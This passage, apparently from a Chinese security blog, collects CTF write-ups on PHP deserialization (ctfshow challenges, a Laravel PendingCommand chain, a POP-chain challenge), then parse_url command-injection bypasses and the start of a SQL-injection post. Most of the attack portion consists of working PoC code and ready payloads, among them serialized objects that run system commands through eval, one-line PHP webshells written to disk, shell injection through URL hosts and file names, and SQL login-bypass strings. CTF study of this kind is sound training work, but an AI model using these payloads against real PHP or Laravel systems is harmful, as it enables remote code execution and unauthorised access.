-&gt;user=O%3a11%3a%22ctfShowUser%22%3a3%3a%7bs%3a8%3a%27username%27%3bs%3a6%3a%27xxxxxx%27%3bs%3a8%3a%27password%27%3bs%3a6%3a%27xxxxxx%27%3bs%3a5%3a%22isVip%22%3bb%3a1%3b%7dpayload2:    GET部分：?username=xxxxxx&amp;password=xxxxxx    COOKIE部分：user=O:11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;isVip&quot;;b:1;&#125;    -&gt;user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D\n&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123;    private $username=&#x27;xxxxxx&#x27;;    private $password=&#x27;xxxxxx&#x27;;    private $isVip=false;    private $class = &#x27;info&#x27;;    public function __construct()&#123;        $this-&gt;class=new info();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class info&#123;    private $user=&#x27;xxxxxx&#x27;;    public function getInfo()&#123;        return $this-&gt;user;    &#125;&#125;class backDoor&#123;    private $code;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    $user-&gt;login($username,$password);&#125;解题思路：    序列化ctfShowUser类和backDoor类，修改&#x27;$isVip&#x27;的值为true，修改&#x27;$code&#x27;的值为系统命令；PoC:&lt;?phpclass ctfShowUser&#123;    private $username = &#x27;xxxxxx&#x27;;    private $password = &#x27;xxxxxx&#x27;;    private $isVip = true;    private $class = &#x27;backDoor&#x27;;    public function __construct()&#123;        $this-&gt;class = new backDoor();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username === $u&amp;&amp;$this-&gt;password === $p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class backDoor&#123;    private $code = &#x27;system(&quot;tac flag.php&quot;);&#x27;;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$p = new ctfShowUser();$a = serialize($p);echo urlencode($a);?&gt;payload:    GET部分：?username=xxxxxx&amp;password=xxxxxx    COOKIE部分：user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A1%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%22tac+flag.php%22%29%3B%22%3B%7D%7D\n&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123;    public $username = &#x27;xxxxxx&#x27;;    public $password = &#x27;xxxxxx&#x27;;    public $isVip = false;    public $class = &#x27;info&#x27;;    public function __construct()&#123;        $this-&gt;class=new info();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class info&#123;    public $user=&#x27;xxxxxx&#x27;;    public function getInfo()&#123;        return $this-&gt;user;    &#125;&#125;class backDoor&#123;    public $code;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    if(!preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))&#123;        $user = unserialize($_COOKIE[&#x27;user&#x27;]);    &#125;    $user-&gt;login($username,$password);&#125;解题思路：增加了过滤，需要在序列化字符串的类名长度前添加&#x27;+&#x27;，同时&#x27;$code&#x27;中不能出现d以后的字母；PoC（注意绕过！）:&lt;?phpclass ctfShowUser&#123;    private $username=&#x27;xxxxxx&#x27;;    private $password=&#x27;xxxxxx&#x27;;    private $isVip=true;    private $class = &#x27;backDoor&#x27;;    public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class backDoor&#123;    private $code = &#x27;system(&quot;tac f*&quot;);&#x27;;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$p=new ctfShowUser();$a=serialize($p);echo urlencode($a);?&gt;payload:    GET部分：?username=xxxxxx&amp;password=xxxxxx    COOKIE部分：user=O%3a%2b11%3a%22ctfShowUser%22%3a4%3a%7bs%3a8%3a%22username%22%3bs%3a6%3a%22xxxxxx%22%3bs%3a8%3a%22password%22%3bs%3a6%3a%22xxxxxx%22%3bs%3a5%3a%22isVip%22%3bb%3a1%3bs%3a5%3a%22class%22%3bO%3a%2b8%3a%22backDoor%22%3a1%3a%7bs%3a4%3a%22code%22%3bs%3a17%3a%22system(%22tac+f*%22)%3b%22%3b%7d%7d\n&lt;?phphighlight_file(__FILE__);class ctfshowvip&#123;    public $username;    public $password;    public $code;    public function __construct($u,$p)&#123;        $this-&gt;username=$u;        $this-&gt;password=$p;    &#125;    public function __wakeup()&#123;        if($this-&gt;username!=&#x27;&#x27; || $this-&gt;password!=&#x27;&#x27;)&#123;            die(&#x27;error&#x27;);        &#125;    &#125;    public function __invoke()&#123;        eval($this-&gt;code);    &#125;    public function __sleep()&#123;        $this-&gt;username=&#x27;&#x27;;        $this-&gt;password=&#x27;&#x27;;    &#125;    public function __unserialize($data)&#123;        $this-&gt;username=$data[&#x27;username&#x27;];        $this-&gt;password=$data[&#x27;password&#x27;];        $this-&gt;code = $this-&gt;username.$this-&gt;password;    &#125;    public function __destruct()&#123;        if($this-&gt;code==0x36d)&#123;            file_put_contents($this-&gt;username, $this-&gt;password);        &#125;    &#125;&#125;unserialize($_GET[&#x27;vip&#x27;]);解题思路：    1. 在PHP7.4以上版本中，当__unserialize()存在时，反序列化会绕过__wakeup()函数；    2. 在destruct()函数中存在file_put_contents()函数，可以写入文件并上传一句话木马；    3. $this-&gt;code==0x36d 是弱类型比较，&#x27;0x36d&#x27;没有打引号，所以代表数字，且数字是877，那么&#x27;877a&#x27;，&#x27;877.php&#x27;等可以满足比较；所以设置$username=&#x27;877.php&#x27;来满足比较；PoC:&lt;?phpclass ctfshowvip&#123;    public $username = &#x27;877.php&#x27;;  // shell，为满足比较命名为877.php    public $password = &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;;  // 一句话木马    public $code = 0x36d;    public function __invoke()&#123;        eval($this-&gt;code);    &#125;    public function __destruct()&#123;        if($this-&gt;code==0x36d)&#123;            file_put_contents($this-&gt;username, $this-&gt;password);  // 将一句话木马写入877.php        &#125;    &#125;&#125;$p=new ctfshowvip();echo serialize($p);?&gt;payload:    GET部分：        ?vip=O:10:&quot;ctfshowvip&quot;:3:&#123;s:8:&quot;username&quot;;s:7:&quot;877.php&quot;;s:8:&quot;password&quot;;s:24:&quot;&lt;?php eval($_POST[1]);?&gt;&quot;;s:4:&quot;code&quot;;i:877;&#125;    反序列化触发后，访问url/877.php        POST部分：        1=system(&#x27;ls&#x27;);        1=system(&#x27;tac /flag_is_here&#x27;);\n&lt;?phphighlight_file(__FILE__);include(&#x27;flag.php&#x27;);class message&#123;    public $from;    public $msg;    public $to;    public $token=&#x27;user&#x27;;    public function __construct($f,$m,$t)&#123;        $this-&gt;from = $f;        $this-&gt;msg = $m;        $this-&gt;to = $t;    &#125;&#125;if(isset($_COOKIE[&#x27;msg&#x27;]))&#123;    $msg = unserialize(base64_decode($_COOKIE[&#x27;msg&#x27;]));    if($msg-&gt;token==&#x27;admin&#x27;)&#123;        echo $flag;    &#125;&#125;考点：字符串逃逸payload1:    ?f=1&amp;m=3&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;构造法2：&lt;?phpclass message&#123;    public $from;    public $msg;    public $to;    public $token=&#x27;admin&#x27;;&#125;$p=new message();echo base64_encode(serialize($p));?&gt;payload2:    GET部分：message.php    COOKIE部分：msg=Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO047czozOiJtc2ciO047czoyOiJ0byI7TjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9\n// Web入门_web263：本题涉及代码审计，代码文件多且代码量较大，故仅放上部分关键代码；解题思路：    0. 访问url/www.zip下载网页源代码；    1. inc.php设置了session的序列化引擎为php，很有可能说明默认使用的是php_serialize    ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);    2. index.php中的$_SESSION[&#x27;limit&#x27;]可控：    //超过5次禁止登陆\tif(isset($_SESSION[&#x27;limit&#x27;]))&#123;\t\t$_SESSION[&#x27;limit&#x27;]&gt;5?die(&quot;登陆失败次数超过限制&quot;):$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);\t\t$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;]) +1);\t&#125;else&#123;\t\t setcookie(&quot;limit&quot;,base64_encode(&#x27;1&#x27;));\t\t $_SESSION[&#x27;limit&#x27;]= 1;\t&#125;    3. inc.php存在User类，开放了文件写入，并且参数&#x27;username&#x27;、&#x27;password&#x27;可控，考虑使用文件包含getshell：    class User&#123;    public $username;    public $password;    public $status;    function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;    function setStatus($s)&#123;        $this-&gt;status=$s;    &#125;    function __destruct()&#123;        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));    &#125;&#125;PoC:&lt;?php  class User&#123;    public $username;    public $password;    public $status;    function __construct()&#123;        $this-&gt;username = &#x27;c.php&#x27;;        $this-&gt;password = &#x27;&lt;?php eval($_POST[1])?&gt;&#x27;;    &#125;    function setStatus($s)&#123;        $this-&gt;status=$s;    &#125;    function __destruct()&#123;        /* 注意此处需要在c.php前添加&#x27;log-&#x27;，即访问log-c.php传参 */        file_put_contents(&quot;log-&quot;.$this-&gt;username, $this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));    &#125;  &#125;  $a = new User();  $a-&gt;setStatus(&#x27;成功&#x27;);  echo base64_encode(&#x27;|&#x27;.serialize($a));  // base64编码对冲base64_decode()?&gt;payload:    执行PoC，构造cookie：    Cookie: PHPSESSID=n3tqrvbda486ahhgkniusjq66g  // 需要事先访问/index.php获取            limit=fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiJjLnBocCI7czo4OiJwYXNzd29yZCI7czoyMzoiPD9waHAgZXZhbCgkX1BPU1RbMV0pPz4iO3M6Njoic3RhdHVzIjtzOjY6IuaIkOWKnyI7fQ==    构造完毕，先访问index.php篡改limit的值，再访问inc.php触发反序列化，将shell写入log-c.php：    GET: /index.php         /inc/inc.php    反序列化触发完毕，访问log-c.php传参获取flag：    GET: /log-c.php    POST: 1=system(&#x27;ls&#x27;);          1=system(&#x27;tac flag.php&#x27;);\n&lt;?phperror_reporting(0);include(&#x27;flag.php&#x27;);highlight_file(__FILE__);class ctfshowAdmin&#123;    public $token;    public $password;    public function __construct($t,$p)&#123;        $this-&gt;token=$t;        $this-&gt;password = $p;    &#125;    public function login()&#123;        return $this-&gt;token===$this-&gt;password; // 不管$t和$p的值是什么，两者指向的地址必须相同    &#125;&#125;$ctfshow = unserialize($_GET[&#x27;ctfshow&#x27;]);$ctfshow-&gt;token=md5(mt_rand());if($ctfshow-&gt;login())&#123;    echo $flag;&#125;PoC:&lt;?phpclass ctfshowAdmin&#123;    public $token;    public $password;    public function __construct($t,$p)&#123;        $this-&gt;token = $t;        $this-&gt;password = $p;    &#125;    public function login()&#123;        return $this-&gt;token === $this-&gt;password;    &#125;&#125;$a = new ctfshowAdmin(22, 33);$a-&gt;password = &amp;$a-&gt;token;echo urlencode(serialize($a));?&gt;payload:    ?ctfshow=O%3A12%3A%22ctfshowAdmin%22%3A2%3A%7Bs%3A5%3A%22token%22%3Bi%3A22%3Bs%3A8%3A%22password%22%3BR%3A2%3B%7D\n&lt;?phphighlight_file(__FILE__);include(&#x27;flag.php&#x27;);$cs = file_get_contents(&#x27;php://input&#x27;);class ctfshow&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public function __construct($u,$p)&#123;        $this-&gt;username=$u;        $this-&gt;password=$p;    &#125;    public function login()&#123;        return $this-&gt;username===$this-&gt;password;    &#125;    public function __toString()&#123;        return $this-&gt;username;    &#125;    public function __destruct()&#123;        global $flag;        echo $flag;    &#125;&#125;$ctfshowo=@unserialize($cs);if(preg_match(&#x27;/ctfshow/&#x27;, $cs))&#123;    throw new Exception(&quot;Error $ctfshowo&quot;,1);&#125;解题思路：    存在关键词过滤，使用大小写绕过；payload:    O:7:&quot;Ctfshow&quot;:2:&#123;s:8:&quot;username&quot;;i:22;s:8:&quot;password&quot;;i:33;&#125;**注：由于hackbar传入数据必须配合变量名，不能单独传入值，需要使用burpsuite进行POST传入**\n// DSBCTF单身杯-Web-签到·好玩的PHP&lt;?php    error_reporting(0);    highlight_file(__FILE__);    class ctfshow &#123;        private $d = &#x27;&#x27;;        private $s = &#x27;&#x27;;        private $b = &#x27;&#x27;;        private $ctf = &#x27;&#x27;;        public function __destruct() &#123;            $this-&gt;d = (string)$this-&gt;d;            $this-&gt;s = (string)$this-&gt;s;            $this-&gt;b = (string)$this-&gt;b;            if (($this-&gt;d != $this-&gt;s) &amp;&amp; ($this-&gt;d != $this-&gt;b) &amp;&amp; ($this-&gt;s != $this-&gt;b)) &#123;                $dsb = $this-&gt;d.$this-&gt;s.$this-&gt;b;                if ((strlen($dsb) &lt;= 3) &amp;&amp; (strlen($this-&gt;ctf) &lt;= 3)) &#123;                    if (($dsb !== $this-&gt;ctf) &amp;&amp; ($this-&gt;ctf !== $dsb)) &#123;                        if (md5($dsb) === md5($this-&gt;ctf)) &#123;                            echo file_get_contents(&quot;/flag.txt&quot;);                        &#125;                    &#125;                &#125;            &#125;        &#125;    &#125;    unserialize($_GET[&quot;dsbctf&quot;]);考点：代码审计、特殊浮点数常量、PHP反序列化解题思路：    使用PHP中的特殊浮点数常量&#x27;NAN&#x27;和&#x27;INF&#x27;来构造payload；    类型不相等、长度均为3，满足最后三个if判断；    由于在第一个判断条件中要求变量&#x27;$dsb&#x27;的三个字符互不相等，因此只能取&#x27;INF&#x27;来构造payload；PoC:&lt;?phpclass ctfshow &#123;    private $d = &#x27;I&#x27;;    private $s = &#x27;N&#x27;;    private $b = &#x27;F&#x27;;    private $ctf = INF;  // 特殊浮点数常量&#125;$p = new ctfshow();echo urlencode(serialize($p));?&gt;payload:    ?dsbctf=O%3A7%3A%22ctfshow%22%3A4%3A%7Bs%3A10%3A%22%00ctfshow%00d%22%3Bs%3A1%3A%22I%22%3Bs%3A10%3A%22%00ctfshow%00s%22%3Bs%3A1%3A%22N%22%3Bs%3A10%3A%22%00ctfshow%00b%22%3Bs%3A1%3A%22F%22%3Bs%3A12%3A%22%00ctfshow%00ctf%22%3Bd%3AINF%3B%7D\n&lt;?php/** * Laravel - A PHP Framework For Web Artisans * * @package  Laravel * @author   Taylor Otwell &lt;taylor@laravel.com&gt; */define(&#x27;LARAVEL_START&#x27;, microtime(true));/*|--------------------------------------------------------------------------| Register The Auto Loader|--------------------------------------------------------------------------|| Composer provides a convenient, automatically generated class loader for| our application. We just need to utilize it! We&#x27;ll simply require it| into the script here so that we don&#x27;t have to worry about manual| loading any of our classes later on. It feels great to relax.|*/require __DIR__ . &#x27;/../vendor/autoload.php&#x27;;/*|--------------------------------------------------------------------------| Turn On The Lights|--------------------------------------------------------------------------|| We need to illuminate PHP development, so let us turn on the lights.| This bootstraps the framework and gets it ready for use, then it| will load up this application so that we can run it and send| the responses back to the browser and delight our users.|*/$app = require_once __DIR__ . &#x27;/../bootstrap/app.php&#x27;;/*|--------------------------------------------------------------------------| Run The Application|--------------------------------------------------------------------------|| Once we have the application, we can handle the incoming request| through the kernel, and send the associated response back to| the client&#x27;s browser allowing them to enjoy the creative| and wonderful application we have prepared for them.|*/$kernel = $app-&gt;make(Illuminate\\Contracts\\Http\\Kernel::class);$response = $kernel-&gt;handle(    $request = Illuminate\\Http\\Request::capture());@unserialize($_POST[&#x27;data&#x27;]);highlight_file(__FILE__);$kernel-&gt;terminate($request, $response);考点：Laravel反序列化漏洞payload:    data=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A2%3A%7Bs%3A22%3A%22%00%2A%00hasBeenBootstrapped%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00bindings%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A1%3A%7Bs%3A8%3A%22concrete%22%3Bs%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3B%7D%7D%7Ds%3A4%3A%22test%22%3BO%3A27%3A%22Illuminate%5CAuth%5CGenericUser%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00attributes%22%3Ba%3A2%3A%7Bs%3A14%3A%22expectedOutput%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7Ds%3A17%3A%22expectedQuestions%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7D%7D%7D%7D\n&lt;?phphighlight_file(__FILE__);class filter&#123;    public $filename;    public $filecontent;    public $evilfile=false;    public function __construct($f,$fn)&#123;        $this-&gt;filename=$f;        $this-&gt;filecontent=$fn;    &#125;    public function checkevil()&#123;        if(preg_match(&#x27;/php|\\.\\./i&#x27;, $this-&gt;filename))&#123;            $this-&gt;evilfile=true;        &#125;        if(preg_match(&#x27;/flag/i&#x27;, $this-&gt;filecontent))&#123;            $this-&gt;evilfile=true;        &#125;        return $this-&gt;evilfile;    &#125;    public function __destruct()&#123;        if($this-&gt;evilfile)&#123;            system(&#x27;rm &#x27;.$this-&gt;filename);        &#125;    &#125;&#125;if(isset($_GET[&#x27;fn&#x27;]))&#123;    $content = file_get_contents(&#x27;php://input&#x27;);    $f = new filter($_GET[&#x27;fn&#x27;], $content);    if($f-&gt;checkevil()===false)&#123;        file_put_contents($_GET[&#x27;fn&#x27;], $content);        copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;);        unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]);        echo &#x27;work done&#x27;;    &#125;    &#125;else&#123;    echo &#x27;where is flag?&#x27;;&#125;解题思路：    存在__destruct魔术方法，能够执行system函数；payload:    ?fn=php;ls    ?fn=php;tac flag.php\n// CTFshow菜狗杯_小舔田&lt;?phpinclude &quot;flag.php&quot;;highlight_file(__FILE__);class Moon&#123;    public $name=&quot;月亮&quot;;    public function __toString()&#123;        return $this-&gt;name;    &#125;        public function __wakeup()&#123;        echo &quot;我是&quot;.$this-&gt;name.&quot;快来赏我&quot;;    &#125;&#125;class Ion_Fan_Princess&#123;    public $nickname=&quot;牛夫人&quot;;    public function call()&#123;        global $flag;        if ($this-&gt;nickname==&quot;小甜甜&quot;)&#123;            echo $flag;        &#125;else&#123;            echo &quot;以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家&quot;.$this-&gt;nickname.&quot;。\\n&quot;;            echo &quot;你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\\n&quot;;        &#125;    &#125;        public function __toString()&#123;        $this-&gt;call();        return &quot;\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t----&quot;.$this-&gt;nickname;    &#125;&#125;if (isset($_GET[&#x27;code&#x27;]))&#123;    unserialize($_GET[&#x27;code&#x27;]);&#125;else&#123;    $a=new Ion_Fan_Princess();    echo $a;&#125;PoC:&lt;?phpclass Moon&#123;    public $name=&quot;月亮&quot;;&#125;class Ion_Fan_Princess&#123;    public $nickname=&quot;牛夫人&quot;;&#125;$a = new Moon();$a-&gt;name = new Ion_Fan_Princess();$a-&gt;name-&gt;nickname = &quot;小甜甜&quot;;echo serialize($a);?&gt;payload:    ?code=O:4:%22Moon%22:1:&#123;s:4:%22name%22;O:16:%22Ion_Fan_Princess%22:1:&#123;s:8:%22nickname%22;s:9:%22%E5%B0%8F%E7%94%9C%E7%94%9C%22;&#125;&#125;\n&lt;?php// 2024春秋杯//error_reporting(0);function PassWAF1($data)&#123;    $BlackList = array(&quot;eval&quot;, &quot;system&quot;, &quot;popen&quot;, &quot;exec&quot;, &quot;assert&quot;, &quot;phpinfo&quot;, &quot;shell_exec&quot;,  &quot;pcntl_exec&quot;, &quot;passthru&quot;, &quot;popen&quot;, &quot;putenv&quot;);    foreach ($BlackList as $value) &#123;        if (preg_match(&quot;/&quot; . $value . &quot;/im&quot;, $data)) &#123;            return true;        &#125;    &#125;    return false;&#125;function PassWAF2($str)&#123;    $output = &#x27;&#x27;;    $count = 0;    foreach (str_split($str, 16) as $v) &#123;        $hex_string = implode(&#x27; &#x27;, str_split(bin2hex($v), 4));        $ascii_string = &#x27;&#x27;;        foreach (str_split($v) as $c) &#123;            $ascii_string .= (($c &lt; &#x27; &#x27; || $c &gt; &#x27;~&#x27;) ? &#x27;.&#x27; : $c);        &#125;        $output .= sprintf(&quot;%08x: %-40s %-16s\\n&quot;, $count, $hex_string, $ascii_string);        $count += 16;    &#125;    return $output;&#125;function PassWAF3($data)&#123;    $BlackList = array(&quot;\\.\\.&quot;, &quot;\\/&quot;);    foreach ($BlackList as $value) &#123;        if (preg_match(&quot;/&quot; . $value . &quot;/im&quot;, $data)) &#123;            return true;        &#125;    &#125;    return false;&#125;function Base64Decode($s)&#123;    $decodeStr = base64_decode($s);    if (is_bool($decodeStr)) &#123;        echo &quot;gg&quot;;        exit(-1);    &#125;    return $decodeStr;&#125;class STU&#123;    public $stu;    public function __construct($stu)&#123;        $this-&gt;stu = $stu;    &#125;    public function __invoke()&#123;        echo $this-&gt;stu;    &#125;&#125;class SDU&#123;    public $Dazhuan;    public function __wakeup()&#123;        $Dazhuan = $this-&gt;Dazhuan;        $Dazhuan();    &#125;&#125;class CTF&#123;    public $hackman;    public $filename;    public function __toString()&#123;        $data = Base64Decode($this-&gt;hackman);        $filename = $this-&gt;filename;        if (PassWAF1($data)) &#123;            echo &quot;so dirty&quot;;            return;        &#125;        if (PassWAF3($filename)) &#123;            echo &quot;just so so?&quot;;            return;        &#125;        file_put_contents($filename, PassWAF2($data));        echo &quot;hack?&quot;;        return &quot;really!&quot;;    &#125;    public function __destruct()&#123;        echo &quot;bye&quot;;    &#125;&#125;$give = $_POST[&#x27;data&#x27;];if (isset($_POST[&#x27;data&#x27;])) &#123;    unserialize($give);&#125; else &#123;    echo &quot;&lt;center&gt;听说pop挺好玩的&lt;/center&gt;&quot;;    highlight_file(__FILE__);&#125;\n防护策略\n不允许用户控制unserialize()的参数；\n控制传入参数，谨慎使用魔术方法；\n禁用危险函数；\n设置白名单过滤，即增加一层序列化和反序列化接口类；\n\nPHPCVE绕过姿势特定函数绕过&lt;?phperror_reporting(0);if(isset($_GET[&#x27;url&#x27;]))&#123;    $url = parse_url($_GET[&#x27;url&#x27;]);    shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; &#x27;.$url[&#x27;path&#x27;]);&#125;else&#123;    highlight_file(__FILE__);&#125;解题思路：    parse_url()用于解析网址并对对应的成员变量赋值；    将host和path赋值为&#x27;`tac fl*`&#x27;和&#x27;1.txt&#x27;，相当于把shell写入文件，再让shell_exec()执行；payload:    ?url=http://1/1;echo `tac fl*` &gt; 1.txt\n&lt;?phperror_reporting(0);if(isset($_GET[&#x27;url&#x27;]))&#123;    $url = parse_url($_GET[&#x27;url&#x27;]);    if(!preg_match(&#x27;/;|&gt;/&#x27;, $url[&#x27;host&#x27;]))&#123;        shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; /tmp/&#x27;.$url[&#x27;path&#x27;]);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;解题思路：    过滤了&#x27;&gt;&#x27;，无法在目录写入数据；payload:    ?url=http://@$(ls)/../var/www/html/1.txt    ?url=http://@$(tac fl*)/../var/www/html/1.txt\n&lt;?phperror_reporting(0);if(isset($_GET[&#x27;url&#x27;]))&#123;    $url = parse_url($_GET[&#x27;url&#x27;]);    if(!preg_match(&#x27;/;|&gt;|http|https/i&#x27;, $url[&#x27;host&#x27;]))&#123;        shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; /tmp/&#x27;.$url[&#x27;path&#x27;]);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;解题思路：    过滤了https和http协议，大小写混淆或自行替换一个即可；payload:    ?url=Http://@$(ls)/../var/www/html/1.txt    ?url=Http://@$(tac fl*)/../var/www/html/1.txt\n&lt;?phperror_reporting(0);if(isset($_GET[&#x27;url&#x27;]))&#123;    $url = parse_url($_GET[&#x27;url&#x27;]);    if(preg_match(&#x27;/^((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.)&#123;3&#125;(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)$/&#x27;, $url[&#x27;host&#x27;]))&#123;        shell_exec(&#x27;curl &#x27;.$url[&#x27;scheme&#x27;].$url[&#x27;host&#x27;].$url[&#x27;path&#x27;]);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;解题思路：    设置了域名校验，必须传入正常的地址；payload:    ?url=http://127.0.0.1/1;echo `ls`&gt;1.txt    ?url=http://127.0.0.1/1;echo `tac fl*`&gt;1.txt\n\n语法绕过&lt;- To be continued  _(:3 ∠)__\n⠀⠀⠀⠀⠀⠀⢀⡞⠹⣦⠰⡞⠙⣆⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⢴⠀⠀⣿⠐⡇⠀⢻⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⢸⠀⠀⣿⢸⡇⠀⢸⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⢀⡸⣄⠀⣿⣨⡇⠀⣟⡀⠀⠀⠀⠀⠀\n⠀⠀⢠⡶⠚⠉⢁⡀⠀⠀⠀⠀⠀⡈⠉⠙⠲⣤⡀⠀\n⢀⡶⠋⠀⢀⠔⠉⠀⠀⠀⠀⠀⠀⠈⠑⢄⠀⠈⠻⡄\n⣾⠁⠀⠀⠈⠀⣠⣂⡄⠀⠀⠀⣔⣢⠀⠈⠀⠀⠀⢹\n⡇⠀⠀⢠⣠⣠⡌⠓⠁⠀⡀⠀⠙⠊⡄⢀⣀⠀⠀⢸\n⢷⡀⠀⠈⠁⠁⠀⠀⠈⠓⡓⠂⠀⠀⠉⠈⠁⠀⠀⡼\n⠈⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡞⠁\n⠀⠀⢾⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⢸⠀⠀\n⠀⠀⠈⢻⡄⠀⠀⠀v我50⠀⠀⠀⠀⠀⡾⠊⠁⠀\n⠀⠀⠀⠘⣇⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⡀⣷⠀⠀⠀\n⠀⠀⠀⠀⢿⣼⠉⠉⠙⠛⠛⠛⠛⠉⢹⣁⠟\n\n\n4oCc5L2g6K+077yM5aW55L+p6IO95pCe5Ye65LuA5LmI5ZCN5aCC5p2l77yM6L+Y6IO95oqK572X5b635bKb5q+B5LqG5LiN5oiQ77yf4oCdCuKAnOayoei1hOaWmeivtOeahOmCo+S5iOWkuOW8oO+8jOWug+eahOaEj+aAneaYr+KApuKApuKAnQrmraTml7bngavnpZ7lj4jlnKjmhInlv6vlnLDmipPkv6notKrlkIPppb&#x2F;niqzkuobvvIg&#x3D;\n","categories":["Web"]},{"title":"SQL注入","url":"/blog233.github.io/2024/10/26/SQL%E6%B3%A8%E5%85%A5/","content":"安全无止境，继续前进吧！\nSQL注入，作为危害性强的漏洞之一，造成的后果相当严重，小到信息泄露，大到系统损毁……你问我怎么知道这些？学的。怎么突然想学这个？……请不要追问。（她想起了被某只白狼调戏的回忆）–by Texas\n\n细节决定成败，SQL注入玩的就是不严谨的前后端交互\n热身：简单的密码绕过原验证登陆语句：    SELECT * FROM admin WHERE Username= &#x27;&quot;.$username.&quot;&#x27; AND Password= &#x27;&quot;.md5($password).&quot;&#x27;payload：    1&#x27; or &#x27;1&#x27;=&#x27;1    1&#x27; or 1=1 or 